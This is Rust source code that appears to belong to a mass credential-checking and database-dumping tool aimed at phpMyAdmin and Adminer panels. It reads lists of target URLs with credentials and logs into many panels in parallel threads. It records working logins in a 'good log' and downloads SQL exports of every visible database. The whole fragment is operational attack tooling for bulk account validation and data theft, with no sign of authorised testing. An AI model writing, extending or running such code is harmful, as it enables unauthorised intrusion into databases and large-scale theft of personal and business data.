
pub async fn load_phpmyadmin_list_summary(path: &Path) -> Result<ParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_credential_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid phpMyAdmin targets in {} ({} lines checked, {} skipped)",
            path.display(),
            summary.total_lines,
            summary.skipped
        );
    }
    Ok(summary)
}

pub async fn load_phpmyadmin_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_phpmyadmin_list_summary(path).await?.credentials)
}

pub async fn load_adminer_list_summary(path: &Path) -> Result<AdminerParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_adminer_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Adminer targets in {} ({} lines checked, {} skipped, {} non-adminer urls filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_adminer
        );
    }
    if summary.filtered_non_adminer > 0 {
        info!(
            "Adminer list {}: filtered {} lines without adminer in url",
            path.display(),
            summary.filtered_non_adminer
        );
    }
    Ok(summary)
}

pub async fn load_adminer_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_adminer_list_summary(path).await?.credentials)
}

async fn download_sql_mass_exports<F, Fut>(
    creds: Vec<Credential>,
    output: PathBuf,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
    site_kind: &'static str,
    fetch: F,
) -> Result<()>
where
    F: Fn(Credential, PathBuf, bool) -> Fut + Send + Sync + Clone + 'static,
    Fut: std::future::Future<Output = Result<(String, u64, usize)>> + Send,
{
    let error_log = init_run_output_dir_errors_only(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        let fetch = fetch.clone();
        let site_kind = site_kind;
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match fetch(cred.clone(), out.clone(), download_files).await {
                Ok((good_detail, bytes, files_count)) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Valid,
                        message: Some(good_detail.clone()),
                        databases: Vec::new(),
                    };
                    emit_scan_result(&cb, &result);
                    let _ = append_good_log(&out, &target_line, &good_detail).await;
                    append_result_bucket(&out, &result).await.ok();
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::Good {
                            target: target_line.clone(),
                            detail: good_detail.clone(),
                            bytes: if download_files { Some(bytes) } else { None },
                        });
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files_count,
                            bytes: Some(bytes),
                        });
                    } else {
                        info!("{site_kind} {target_line} — {good_detail}");
                    }
                }
                Err(err) => {
                    let site_dir = cred.site_output_dir(&out, site_kind);
                    remove_site_tree_if_no_files(&site_dir).await;
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_mass_sql_outcome(&out, &result, &cb).await;
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn download_phpmyadmin_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<PhpMyAdminClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let cfg = config.clone();
    download_sql_mass_exports(
        creds,
        output,
        threads,
        download_files,
        on_progress,
        cancel,
        "pma",
        move |cred, out, download_files| {
            let cfg = cfg.clone();
            async move {
                match download_phpmyadmin_account(&cred, &cfg, &out, download_files).await {
                    Ok((stats, files)) => {
                        let good = if download_files {
                            !files.is_empty() && stats.bytes > 0
                        } else {
                            stats.databases > 0
                        };
                        if !good {
                            let err = if download_files {
                                "phpMyAdmin: login ok but no SQL dumps saved"
                            } else {
                                "phpMyAdmin: check ok but no databases visible"
                            };
                            anyhow::bail!(err);
                        }
                        let login_at = Local::now().format("%Y-%m-%d %H:%M:%S");
                        let good_detail =
                            format!("login ok at {login_at}; {}", stats.detail_line());
                        Ok((good_detail, stats.bytes, files.len()))
                    }
                    Err(err) => Err(err),
                }
            }
        },
    )
    .await
}

pub async fn download_adminer_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<AdminerClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let cfg = config.clone();
    download_sql_mass_exports(
        creds,
        output,
        threads,
        download_files,
        on_progress,
        cancel,
        "adminer",
        move |cred, out, download_files| {
            let cfg = cfg.clone();
            async move {
                match download_adminer_account(&cred, &cfg, &out, download_files).await {
                    Ok((stats, files)) => {
                        let good = if download_files {
                            !files.is_empty() && stats.bytes > 0
                        } else {
                            stats.databases > 0
                        };
                        if !good {
                            let err = if download_files {
                                "Adminer: login ok but no SQL dumps saved"
                            } else {
                                "Adminer: check ok but no databases visible"
                            };
                            anyhow::bail!(err);
                        }
                        let login_at = Local::now().format("%Y-%m-%d %H:%M:%S");
                        let good_detail =
                            format!("login ok at {login_at}; {}", stats.detail_line());
                        Ok((good_detail, stats.bytes, files.len()))
                    }
                    Err(err) => Err(err),
                }
            }
        },
    )
    .await
}

